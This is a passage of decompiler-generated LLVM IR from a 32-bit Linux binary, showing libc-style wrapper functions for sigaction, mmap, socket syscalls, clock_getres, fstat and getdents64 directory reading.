  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8053000.57 to i32), i32 -134557696), i32 2), i32 0), label %dec_label_pc_8051d81, label %dec_label_pc_8051d8d

dec_label_pc_8051d81:                             ; preds = %dec_label_pc_8051d69, %dec_label_pc_8051d81
  %v4_8051d81 = phi i32 [ %v1_8051d88, %dec_label_pc_8051d81 ], [ 0, %dec_label_pc_8051d69 ]
  store i32 ptrtoint (i32* @global_var_8051d88.69 to i32), i32* %stack_var_-160, align 4
  %v5_8051d81 = mul i32 %v4_8051d81, 4
  %v6_8051d81 = add i32 %v5_8051d81, ptrtoint (i32* @global_var_8053000.57 to i32)
  %v7_8051d81 = inttoptr i32 %v6_8051d81 to i32*
  %v8_8051d81 = load i32, i32* %v7_8051d81, align 4
  call void @__pseudo_call(i32 %v8_8051d81)
  %v0_8051d88 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051d88 = add i32 %v0_8051d88, 1
  store i32 %v1_8051d88, i32* %ebx.global-to-local, align 4
  %v1_8051d89 = load i32, i32* %esi.global-to-local, align 4
  %v7_8051d89 = icmp ult i32 %v1_8051d88, %v1_8051d89
  br i1 %v7_8051d89, label %dec_label_pc_8051d81, label %dec_label_pc_8051d8d

dec_label_pc_8051d8d:                             ; preds = %dec_label_pc_8051d81, %dec_label_pc_8051d69
  %v0_8051d96 = load i32, i32* %stack_var_-160, align 4
  %v1_8051d96 = call i32 @function_805021b(i32 %v0_8051d96)
  %v1_8051d9b = inttoptr i32 %v1_8051d96 to i32*
  store i32 0, i32* %v1_8051d9b, align 4
  store i32 0, i32* @eax, align 4
  store i32 0, i32* %stack_var_-160, align 4
  %v0_8051dbc = load i32, i32* @edi, align 4
  store i32 %v0_8051dbc, i32* %stack_var_-168, align 4
  call void @__pseudo_call(i32 %arg1)
  %v0_8051dcb = load i32, i32* @eax, align 4
  %v1_8051dce = call i32 @function_805182e(i32 %v0_8051dcb)
  %v0_8051dd9 = load i32, i32* @ebx, align 4
  %v1_8051dd9 = inttoptr i32 %v0_8051dd9 to %sigcontext*
  %v2_8051dd9 = call i32 @sigreturn(%sigcontext* %v1_8051dd9)
  %v0_8051de1 = load i32, i32* @ebx, align 4
  %v1_8051de1 = inttoptr i32 %v0_8051de1 to %sigcontext*
  %v2_8051de1 = call i32 @sigreturn(%sigcontext* %v1_8051de1)
  ret i32 %v2_8051de1

; uselistorder directives
  uselistorder i32 %v1_8051d88, { 1, 2, 0 }
  uselistorder i32 %v1_8051d64, { 1, 2, 0 }
  uselistorder i32 %v2_8051ca4, { 1, 0 }
  uselistorder i32 %v1_8051ca1, { 2, 1, 0 }
  uselistorder i32 %v1_8051c80, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8051c7d, { 1, 0 }
  uselistorder i32* %stack_var_-160, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %stack_var_-168, { 0, 1, 3, 2 }
  uselistorder i32 (i32)* @function_805182e, { 0, 2, 1 }
  uselistorder i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8053000.57 to i32), i32 -134557696), i32 2), { 1, 3, 2, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_8053000.57 to i32), i32 -134557696), { 0, 2, 1 }
  uselistorder i32 ()* @function_8051ba6, { 2, 1, 0 }
  uselistorder i32 131072, { 2, 1, 0 }
  uselistorder i32 -65536, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8051d81, { 1, 0 }
  uselistorder label %dec_label_pc_8051d5d, { 1, 0 }
  uselistorder label %dec_label_pc_8051d38, { 1, 0 }
  uselistorder label %dec_label_pc_8051ca1, { 1, 0 }
  uselistorder label %dec_label_pc_8051c89, { 1, 0 }
}

define i32 @function_8051de3(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8051de3:
  %ebx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg2 to i32
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_8051de3 = load i32, i32* @esi, align 4
  %v0_8051de4 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_8051df9 = icmp eq i32* %arg2, null
  br i1 %v1_8051df9, label %dec_label_pc_8051de3.dec_label_pc_8051e4c_crit_edge, label %dec_label_pc_8051dfd

dec_label_pc_8051de3.dec_label_pc_8051e4c_crit_edge: ; preds = %dec_label_pc_8051de3
  br label %dec_label_pc_8051e4c

dec_label_pc_8051dfd:                             ; preds = %dec_label_pc_8051de3
  %v2_8051dfd = load i32, i32* %arg2, align 4
  store i32 %v2_8051dfd, i32* %stack_var_-148, align 4
  %v1_8051e06 = add i32 %tmp11, 4
  %v3_8051e18 = bitcast i32* %stack_var_-136 to i16*
  %v4_8051e18 = call i32 @function_8052466(i16* %v3_8051e18, i32 %v1_8051e06, i32 128)
  br label %dec_label_pc_8051e4c

dec_label_pc_8051e4c:                             ; preds = %dec_label_pc_8051de3.dec_label_pc_8051e4c_crit_edge, %dec_label_pc_8051dfd
  %v1_8051e4e = icmp eq i32 %arg3, 0
  %v2_8051e52 = ptrtoint i32* %stack_var_-288 to i32
  %.v2_8051e52 = select i1 %v1_8051e4e, i32 0, i32 %v2_8051e52
  %phitmp = bitcast i32* %stack_var_-148 to %sigaction*
  %v0_8051e66 = select i1 %v1_8051df9, %sigaction* null, %sigaction* %phitmp
  %v5_8051e6e = call i32 @function_8051f09(i32 %arg1, %sigaction* %v0_8051e66, i32 %.v2_8051e52, i32 8)
  store i32 %v5_8051e6e, i32* %ebx.global-to-local, align 4
  %v2_8051e7c = icmp slt i32 %v5_8051e6e, 0
  %or.cond = or i1 %v1_8051e4e, %v2_8051e7c
  br i1 %or.cond, label %dec_label_pc_8051eb1, label %dec_label_pc_8051e80

dec_label_pc_8051e80:                             ; preds = %dec_label_pc_8051e4c
  %v3_8051e80 = load i32, i32* %stack_var_-288, align 4
  %v2_8051e84 = inttoptr i32 %arg3 to i32*
  store i32 %v3_8051e80, i32* %v2_8051e84, align 4
  %v2_8051e8c = ptrtoint i32* %stack_var_-276 to i32
  %v1_8051e91 = add i32 %arg3, 4
  %v3_8051e95 = inttoptr i32 %v1_8051e91 to i16*
  %v4_8051e95 = call i32 @function_8052466(i16* %v3_8051e95, i32 %v2_8051e8c, i32 128)
  %v2_8051e9e = add i32 %arg3, 132
  %v3_8051e9e = inttoptr i32 %v2_8051e9e to i32*
  %v2_8051eab = add i32 %arg3, 136
  %v3_8051eab = inttoptr i32 %v2_8051eab to i32*
  %v0_8051eb1.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051eb1

dec_label_pc_8051eb1:                             ; preds = %dec_label_pc_8051e4c, %dec_label_pc_8051e80
  %v0_8051eb1 = phi i32 [ %v5_8051e6e, %dec_label_pc_8051e4c ], [ %v0_8051eb1.pre, %dec_label_pc_8051e80 ]
  store i32 %v0_8051de4, i32* @ebx, align 4
  store i32 %v0_8051de3, i32* @esi, align 4
  ret i32 %v0_8051eb1

; uselistorder directives
  uselistorder i32 128, { 0, 1, 3, 2 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_8051eb1, { 1, 0 }
  uselistorder label %dec_label_pc_8051e4c, { 1, 0 }
}

define i32 @function_8051ebc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_8051ebc:
  %stack_var_4 = alloca i32, align 4
  %v0_8051ebc = load i32, i32* @ebx, align 4
  store i32 %v0_8051ebc, i32* @edx, align 4
  %v2_8051ec7 = load i32, i32* @ecx, align 4
  %v4_8051ec7 = load i32, i32* @esi, align 4
  %v5_8051ec7 = load i32, i32* @edi, align 4
  %v6_8051ec7 = load i32, i32* @ebp, align 4
  %v7_8051ec7 = call i32* @mmap(i32* nonnull %stack_var_4, i32 %v2_8051ec7, i32 %v0_8051ebc, i32 %v4_8051ec7, i32 %v5_8051ec7, i32 %v6_8051ec7)
  %v8_8051ec7 = ptrtoint i32* %v7_8051ec7 to i32
  store i32 %v0_8051ebc, i32* @ebx, align 4
  %v3_8051ed0 = icmp ugt i32* %v7_8051ec7, inttoptr (i32 -4096 to i32*)
  call void @__pseudo_cond_branch(i1 %v3_8051ed0, i32 134555009)
  ret i32 %v8_8051ec7

; uselistorder directives
  uselistorder i32* @ebp, { 1, 18, 19, 20, 21, 22, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 16, 12, 13, 14, 15, 0, 17, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i32* @ecx, { 3, 36, 33, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 17, 4, 5, 1, 6, 35, 34, 28, 29, 2, 30, 31, 32, 37 }
}

define i32 @function_8051ed7(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8051ed7:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051ed7 = load i32, i32* @ebx, align 4
  store i32 %v0_8051ed7, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_8051eea = call i32 @int80_syscall(i32 102)
  store i32 %v1_8051eea, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v1_8051eea, -4095
  br i1 %tmp9, label %dec_label_pc_8051f03, label %dec_label_pc_8051ef7

dec_label_pc_8051ef7:                             ; preds = %dec_label_pc_8051ed7
  %v1_8051ef7 = call i32 @function_805021b(i32 %v0_8051ed7)
  %v0_8051efc = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051efc = sub i32 0, %v0_8051efc
  %v2_8051efe = inttoptr i32 %v1_8051ef7 to i32*
  store i32 %v1_8051efc, i32* %v2_8051efe, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8051f07.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8051f03

dec_label_pc_8051f03:                             ; preds = %dec_label_pc_8051ed7, %dec_label_pc_8051ef7
  %v2_8051f07 = phi i32 [ %v0_8051ed7, %dec_label_pc_8051ed7 ], [ %v2_8051f07.pre, %dec_label_pc_8051ef7 ]
  %v0_8051f03 = phi i32 [ %v1_8051eea, %dec_label_pc_8051ed7 ], [ -1, %dec_label_pc_8051ef7 ]
  %v2_8051f05 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051f05, i32* @edx, align 4
  store i32 %v2_8051f07, i32* @ebx, align 4
  ret i32 %v0_8051f03

; uselistorder directives
  uselistorder i32 %v1_8051eea, { 1, 0, 2 }
  uselistorder i32 102, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8051f03, { 1, 0 }
}

define i32 @function_8051f09(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051f09:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg3 to %sigaction*
  %stack_var_-8 = alloca i32, align 4
  %v0_8051f0a = load i32, i32* @esi, align 4
  store i32 %v0_8051f0a, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_8051f1e = load i32, i32* @ebx, align 4
  %v7_8051f26 = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp5)
  store i32 %v7_8051f26, i32* %esi.global-to-local, align 4
  %tmp14 = icmp ult i32 %v7_8051f26, -4095
  br i1 %tmp14, label %dec_label_pc_8051f3e, label %dec_label_pc_8051f32

dec_label_pc_8051f32:                             ; preds = %dec_label_pc_8051f09
  %v1_8051f32 = call i32 @function_805021b(i32 %v0_8051f1e)
  %v0_8051f37 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051f37 = sub i32 0, %v0_8051f37
  %v2_8051f39 = inttoptr i32 %v1_8051f32 to i32*
  store i32 %v1_8051f37, i32* %v2_8051f39, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_8051f41.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8051f3e

dec_label_pc_8051f3e:                             ; preds = %dec_label_pc_8051f09, %dec_label_pc_8051f32
  %v2_8051f41 = phi i32 [ %v0_8051f0a, %dec_label_pc_8051f09 ], [ %v2_8051f41.pre, %dec_label_pc_8051f32 ]
  %v0_8051f3e = phi i32 [ %v7_8051f26, %dec_label_pc_8051f09 ], [ -1, %dec_label_pc_8051f32 ]
  store i32 %v2_8051f41, i32* @esi, align 4
  ret i32 %v0_8051f3e

; uselistorder directives
  uselistorder i32 %v7_8051f26, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051f3e, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @function_8051f44(i32 %arg1) local_unnamed_addr #0 {
dec_label_pc_8051f44:
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg1, i32* @ebx, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @function_8051f6c(i32 %arg1, %timespec* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051f6c:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051f6c = load i32, i32* @ebx, align 4
  store i32 %v0_8051f6c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_8051f7f = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_8051f7f, i32* %ebx.global-to-local, align 4
  %tmp10 = icmp ult i32 %v4_8051f7f, -4095
  br i1 %tmp10, label %dec_label_pc_8051f98, label %dec_label_pc_8051f8c

dec_label_pc_8051f8c:                             ; preds = %dec_label_pc_8051f6c
  %v1_8051f8c = call i32 @function_805021b(i32 %v0_8051f6c)
  %v0_8051f91 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051f91 = sub i32 0, %v0_8051f91
  %v2_8051f93 = inttoptr i32 %v1_8051f8c to i32*
  store i32 %v1_8051f91, i32* %v2_8051f93, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8051f9c.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8051f98

dec_label_pc_8051f98:                             ; preds = %dec_label_pc_8051f6c, %dec_label_pc_8051f8c
  %v2_8051f9c = phi i32 [ %v0_8051f6c, %dec_label_pc_8051f6c ], [ %v2_8051f9c.pre, %dec_label_pc_8051f8c ]
  %v0_8051f98 = phi i32 [ %v4_8051f7f, %dec_label_pc_8051f6c ], [ -1, %dec_label_pc_8051f8c ]
  %v2_8051f9a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051f9a, i32* @edx, align 4
  store i32 %v2_8051f9c, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8051f98

; uselistorder directives
  uselistorder i32 %v4_8051f7f, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051f98, { 1, 0 }
}

define i32 @function_8051f9e(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051f9e:
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051f9e = load i32, i32* @ebx, align 4
  store i32 %v0_8051f9e, i32* %stack_var_-4, align 4
  %tmp11 = bitcast i32* %stack_var_-68 to %stat*
  %v4_8051fb1 = call i32 @fstat(i32 %arg1, %stat* %tmp11)
  store i32 %v4_8051fb1, i32* @ebx, align 4
  %tmp13 = icmp ult i32 %v4_8051fb1, -4095
  br i1 %tmp13, label %dec_label_pc_8051fcc, label %dec_label_pc_8051fbe

dec_label_pc_8051fbe:                             ; preds = %dec_label_pc_8051f9e
  %v1_8051fbe = call i32 @function_805021b(i32 %v0_8051f9e)
  %v0_8051fc3 = load i32, i32* @ebx, align 4
  %v1_8051fc3 = sub i32 0, %v0_8051fc3
  %v2_8051fc5 = inttoptr i32 %v1_8051fbe to i32*
  store i32 %v1_8051fc3, i32* %v2_8051fc5, align 4
  %v2_8051fe4.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8051fdf

dec_label_pc_8051fcc:                             ; preds = %dec_label_pc_8051f9e
  %v1_8051fcc = icmp eq i32 %v4_8051fb1, 0
  %v1_8051fce = icmp eq i1 %v1_8051fcc, false
  br i1 %v1_8051fce, label %dec_label_pc_8051fdf, label %dec_label_pc_8051fd0

dec_label_pc_8051fd0:                             ; preds = %dec_label_pc_8051fcc
  %v4_8051fd7 = bitcast i32* %stack_var_-68 to i16*
  %v5_8051fd7 = call i32 @function_80523e9(i16* %v4_8051fd7, i32 %arg2, i32 %v4_8051fb1, i32 %v4_8051fb1)
  %v0_8051fdf.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051fdf

dec_label_pc_8051fdf:                             ; preds = %dec_label_pc_8051fcc, %dec_label_pc_8051fbe, %dec_label_pc_8051fd0
  %v2_8051fe4 = phi i32 [ %v0_8051f9e, %dec_label_pc_8051fcc ], [ %v2_8051fe4.pre, %dec_label_pc_8051fbe ], [ %v0_8051f9e, %dec_label_pc_8051fd0 ]
  %v0_8051fdf = phi i32 [ %v4_8051fb1, %dec_label_pc_8051fcc ], [ -1, %dec_label_pc_8051fbe ], [ %v0_8051fdf.pre, %dec_label_pc_8051fd0 ]
  store i32 %v2_8051fe4, i32* @ebx, align 4
  ret i32 %v0_8051fdf

; uselistorder directives
  uselistorder i32 %v4_8051fb1, { 1, 2, 3, 4, 0, 5 }
  uselistorder label %dec_label_pc_8051fdf, { 2, 0, 1 }
}

define i32 @function_8051fe6(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051fe6:
  %eax.global-to-local = alloca i32, align 4
  %v0_8051fe6 = load i32, i32* @edi, align 4
  %v0_8051fe7 = load i32, i32* @esi, align 4
  %v0_8051fe8 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v0_8051fed = load i32, i32* @edx, align 4
  %v7_8051ff7 = inttoptr i32 %arg2 to i32*
  %v8_8051ff7 = call i32 @function_8052055(i32 %arg1, i32* %v7_8051ff7, i32 %arg3, i32 %v0_8051fed, i32 %v0_8051fe8, i32 %v0_8051fe7, i32 %v0_8051fe6)
  store i32 %v8_8051ff7, i32* %eax.global-to-local, align 4
  store i32 %v8_8051ff7, i32* @esi, align 4
  %tmp24 = icmp slt i32 %v8_8051ff7, 1
  br i1 %tmp24, label %dec_label_pc_805204f, label %dec_label_pc_8052005

dec_label_pc_8052005:                             ; preds = %dec_label_pc_8051fe6
  %v0_8052005 = load i32, i32* @ebx, align 4
  %v2_8052005 = add i32 %v0_8052005, %v8_8051ff7
  store i32 %v2_8052005, i32* @edi, align 4
  %v7_805204b4 = icmp ult i32 %v0_8052005, %v2_8052005
  br i1 %v7_805204b4, label %dec_label_pc_805200a, label %dec_label_pc_805204f

dec_label_pc_805200a:                             ; preds = %dec_label_pc_8052005, %dec_label_pc_805200a
  %v0_805200a = phi i32 [ %v2_8052049, %dec_label_pc_805200a ], [ %v0_8052005, %dec_label_pc_8052005 ]
  %v1_805200a = add i32 %v0_805200a, 8
  %v2_805200a = inttoptr i32 %v1_805200a to i32*
  %v3_805200a = load i32, i32* %v2_805200a, align 4
  store i32 %v3_805200a, i32* %eax.global-to-local, align 4
  %v2_805200d = add i32 %v0_805200a, 4
  %v3_805200d = inttoptr i32 %v2_805200d to i32*
  store i32 %v3_805200a, i32* %v3_805200d, align 4
  %v0_8052010 = load i32, i32* @ebx, align 4
  %v1_8052010 = add i32 %v0_8052010, 16
  %v2_8052010 = inttoptr i32 %v1_8052010 to i32*
  %v3_8052010 = load i32, i32* %v2_8052010, align 4
  store i32 %v3_8052010, i32* %eax.global-to-local, align 4
  %v1_8052013 = trunc i32 %v3_8052010 to i16
  %v3_8052013 = add i32 %v0_8052010, 8
  %v4_8052013 = inttoptr i32 %v3_8052013 to i16*
  store i16 %v1_8052013, i16* %v4_8052013, align 2
  %v0_8052017 = load i32, i32* @ebx, align 4
  %v1_8052017 = add i32 %v0_8052017, 18
  %v2_8052017 = inttoptr i32 %v1_8052017 to i8*
  %v3_8052017 = load i8, i8* %v2_8052017, align 1
  %v4_8052017 = zext i8 %v3_8052017 to i32
  %v5_8052017 = load i32, i32* %eax.global-to-local, align 4
  %v6_8052017 = and i32 %v5_8052017, -256
  %v7_8052017 = or i32 %v6_8052017, %v4_8052017
  store i32 %v7_8052017, i32* %eax.global-to-local, align 4
  %v3_805201a = add i32 %v0_8052017, 10
  %v4_805201a = inttoptr i32 %v3_805201a to i8*
  store i8 %v3_8052017, i8* %v4_805201a, align 1
  %v0_805201e = load i32, i32* @ebx, align 4
  %v1_805201e = add i32 %v0_805201e, 8
  %v2_805201e = inttoptr i32 %v1_805201e to i16*
  %v3_805201e = load i16, i16* %v2_805201e, align 2
  %v4_805201e = zext i16 %v3_805201e to i32
  %v1_8052022 = add nsw i32 %v4_805201e, -19
  %v1_8052026 = add i32 %v0_805201e, 19
  %v1_805202a = add i32 %v0_805201e, 11
  store i32 %v1_805202a, i32* %eax.global-to-local, align 4
  %v3_805202e = inttoptr i32 %v1_805202a to i8*
  %v4_805202e = call i32 @function_8050245(i8* %v3_805202e, i32 %v1_8052026, i32 %v1_8052022)
  store i32 %v4_805202e, i32* %eax.global-to-local, align 4
  %v0_8052036 = load i32, i32* @ebx, align 4
  %v1_8052036 = add i32 %v0_8052036, 8
  %v2_8052036 = inttoptr i32 %v1_8052036 to i16*
  %v3_8052036 = load i16, i16* %v2_8052036, align 2
  %v4_8052036 = zext i16 %v3_8052036 to i32
  store i32 %v4_8052036, i32* %eax.global-to-local, align 4
  %v3_805203d = inttoptr i32 %v0_8052036 to i8*
  %v4_805203d = call i32 @function_8050245(i8* %v3_805203d, i32 %v0_8052036, i32 %v4_8052036)
  store i32 %v4_805203d, i32* %eax.global-to-local, align 4
  %v0_8052042 = load i32, i32* @ebx, align 4
  %v1_8052042 = add i32 %v0_8052042, 8
  %v2_8052042 = inttoptr i32 %v1_8052042 to i16*
  %v3_8052042 = load i16, i16* %v2_8052042, align 2
  %v4_8052042 = zext i16 %v3_8052042 to i32
  store i32 %v4_8052042, i32* %eax.global-to-local, align 4
  %v2_8052049 = add i32 %v4_8052042, %v0_8052042
  store i32 %v2_8052049, i32* @ebx, align 4
  %v1_805204b = load i32, i32* @edi, align 4
  %v7_805204b = icmp ult i32 %v2_8052049, %v1_805204b
  br i1 %v7_805204b, label %dec_label_pc_805200a, label %dec_label_pc_805204b.dec_label_pc_805204f.loopexit_crit_edge

dec_label_pc_805204b.dec_label_pc_805204f.loopexit_crit_edge: ; preds = %dec_label_pc_805200a
  %v0_805204f.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805204f

dec_label_pc_805204f:                             ; preds = %dec_label_pc_8052005, %dec_label_pc_805204b.dec_label_pc_805204f.loopexit_crit_edge, %dec_label_pc_8051fe6
  %v0_805204f = phi i32 [ %v8_8051ff7, %dec_label_pc_8051fe6 ], [ %v0_805204f.pre.pre, %dec_label_pc_805204b.dec_label_pc_805204f.loopexit_crit_edge ], [ %v8_8051ff7, %dec_label_pc_8052005 ]
  store i32 %v0_805204f, i32* %eax.global-to-local, align 4
  store i32 %v0_8051fe7, i32* @esi, align 4
  store i32 %v0_8051fe6, i32* @edi, align 4
  ret i32 %v0_805204f

; uselistorder directives
  uselistorder i32 %v0_805204f, { 1, 0 }
  uselistorder i32 %v2_8052049, { 1, 2, 0 }
  uselistorder i32 %v0_8052036, { 1, 0, 2 }
  uselistorder i32 %v0_805201e, { 1, 0, 2 }
  uselistorder i32 %v0_805200a, { 1, 0 }
  uselistorder i32 %v0_8052005, { 0, 2, 1 }
  uselistorder i32 %v8_8051ff7, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i8*, i32, i32)* @function_8050245, { 0, 1, 3, 2 }
  uselistorder i32 11, { 5, 3, 4, 6, 2, 7, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_805204f, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805200a, { 1, 0 }
}

define i32 @function_8052055(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_8052055:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %tmp14 = ptrtoint i32* %arg2 to i32
  %stack_var_-60 = alloca i32, align 4
  %v0_8052058 = load i32, i32* @edi, align 4
  %v0_805205a = load i32, i32* @ebx, align 4
  %v15_805205b = ptrtoint i32* %stack_var_-60 to i32
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v1_8052064 = add i32 %arg3, 30
  %v1_805206a = and i32 %v1_8052064, -16
  %v2_805206d = sub i32 %v15_805205b, %v1_805206a
  %v1_805206f = add i32 %v2_805206d, 15
  %v1_8052073 = and i32 %v1_805206f, -16
  %v1_8052079 = inttoptr i32 %v1_8052073 to %linux_dirent64*
  store i32 %v1_8052073, i32* %ecx.global-to-local, align 4
  %v2_805207b = add i32 %v2_805206d, -4
  %v3_805207b = inttoptr i32 %v2_805207b to i32*
  store i32 %v0_805205a, i32* %v3_805207b, align 4
  %v0_805207c = load i32, i32* %edi.global-to-local, align 4
  store i32 220, i32* %eax.global-to-local, align 4
  %v5_8052083 = call i32 @getdents64(i32 %v0_805207c, %linux_dirent64* %v1_8052079, i32 %arg3)
  store i32 %v5_8052083, i32* %eax.global-to-local, align 4
  %v0_8052085 = load i32, i32* @esp, align 4
  %v3_8052085 = add i32 %v0_8052085, 4
  %tmp39 = icmp ult i32 %v5_8052083, -4095
  br i1 %tmp39, label %dec_label_pc_80520a5, label %dec_label_pc_8052090

dec_label_pc_8052090:                             ; preds = %dec_label_pc_8052055
  %v1_8052090 = call i32 @function_805021b(i32 %v5_8052083)
  store i32 %v1_8052090, i32* %eax.global-to-local, align 4
  %v4_8052095 = sub i32 0, %v5_8052083
  %v2_805209b = inttoptr i32 %v1_8052090 to i32*
  store i32 %v4_8052095, i32* %v2_805209b, align 4
  br label %dec_label_pc_8052161

dec_label_pc_80520a5:                             ; preds = %dec_label_pc_8052055
  store i32 %tmp14, i32* @esi, align 4
  store i32 %v1_8052073, i32* @ebx, align 4
  %v5_8052151 = add i32 %v5_8052083, %v1_8052073
  store i32 %v5_8052151, i32* %eax.global-to-local, align 4
  %v7_805215429 = icmp ult i32 %v1_8052073, %v5_8052151
  br i1 %v7_805215429, label %dec_label_pc_80520be.lr.ph, label %dec_label_pc_805215c

dec_label_pc_80520be.lr.ph:                       ; preds = %dec_label_pc_80520a5
  %v5_80520cb = add i32 %tmp14, %arg3
  br label %dec_label_pc_80520be

dec_label_pc_80520be:                             ; preds = %dec_label_pc_80520be.lr.ph, %dec_label_pc_8052100
  %stack_var_-32.034 = phi i32 [ -1, %dec_label_pc_80520be.lr.ph ], [ %v3_8052103, %dec_label_pc_8052100 ]
  %stack_var_-36.033 = phi i32 [ -1, %dec_label_pc_80520be.lr.ph ], [ %v3_8052100, %dec_label_pc_8052100 ]
  %v0_805210c32 = phi i32 [ %v1_8052073, %dec_label_pc_80520be.lr.ph ], [ %v2_8052149, %dec_label_pc_8052100 ]
  %v1_805211131 = phi i32 [ %tmp14, %dec_label_pc_80520be.lr.ph ], [ %v2_80520ce, %dec_label_pc_8052100 ]
  %v0_80520d830 = phi i32 [ %v3_8052085, %dec_label_pc_80520be.lr.ph ], [ %v1_805214b, %dec_label_pc_8052100 ]
  %v1_80520be = add i32 %v0_805210c32, 16
  %v2_80520be = inttoptr i32 %v1_80520be to i16*
  %v3_80520be = load i16, i16* %v2_80520be, align 2
  %v4_80520be = zext i16 %v3_80520be to i32
  %v1_80520c2 = add nuw nsw i32 %v4_80520be, 3
  %v1_80520c8 = and i32 %v1_80520c2, 131068
  store i32 %v1_80520c8, i32* %ecx.global-to-local, align 4
  store i32 %v5_80520cb, i32* %eax.global-to-local, align 4
  %v2_80520ce = add i32 %v1_80520c8, %v1_805211131
  %tmp40 = icmp ugt i32 %v2_80520ce, %v5_80520cb
  br i1 %tmp40, label %dec_label_pc_80520d8, label %dec_label_pc_8052100

dec_label_pc_80520d8:                             ; preds = %dec_label_pc_80520be
  %v1_80520d8 = add i32 %v0_80520d830, -4
  %v2_80520d8 = inttoptr i32 %v1_80520d8 to i32*
  store i32 0, i32* %v2_80520d8, align 4
  %v5_80520da = add i32 %v0_80520d830, -8
  %v6_80520da = inttoptr i32 %v5_80520da to i32*
  store i32 %stack_var_-32.034, i32* %v6_80520da, align 4
  %v5_80520dd = add i32 %v0_80520d830, -12
  %v6_80520dd = inttoptr i32 %v5_80520dd to i32*
  store i32 %stack_var_-36.033, i32* %v6_80520dd, align 4
  %v5_80520e0 = add i32 %v0_80520d830, -16
  %v6_80520e0 = inttoptr i32 %v5_80520e0 to i32*
  store i32 %arg1, i32* %v6_80520e0, align 4
  %v1_80520e3 = call i32 @function_805226b(i32 %v2_80520ce)
  store i32 %v1_80520e3, i32* %eax.global-to-local, align 4
  %v0_80520eb = load i32, i32* @esi, align 4
  %v15_80520eb = icmp eq i32 %v0_80520eb, %tmp14
  %v1_80520ee = icmp eq i1 %v15_80520eb, false
  br i1 %v1_80520ee, label %dec_label_pc_805215c, label %dec_label_pc_80520f0

